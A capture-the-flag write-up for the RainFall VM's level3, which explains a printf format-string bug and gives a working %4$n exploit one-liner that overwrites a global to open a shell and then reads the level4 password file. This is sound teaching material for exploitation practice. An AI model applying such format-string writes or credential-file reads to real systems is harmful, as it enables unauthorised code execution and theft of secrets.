# level3 → level4

`v` uses the input as the format string in `printf(input)`. Its global `m`
is at `0x0804988c`, and `m == 64` opens a shell. On 32-bit x86, the first
four bytes of the input are `printf`'s fourth apparent argument. `%4$n`
writes the number of bytes printed so far through that address. The four
address bytes and 60 `A`s make exactly 64 bytes.

From the level3 account on the RainFall VM:

```sh
(
  python2.7 -c 'import struct; print struct.pack("<I",0x0804988c) + "A"*60 + "%4$n"'
  cat
) | ./level3
id
cat /home/user/level4/.pass
```

Use `objdump -t ./level3` to locate `m`, and `disassemble v` in GDB to
confirm the unguarded `printf` and comparison with `0x40`.
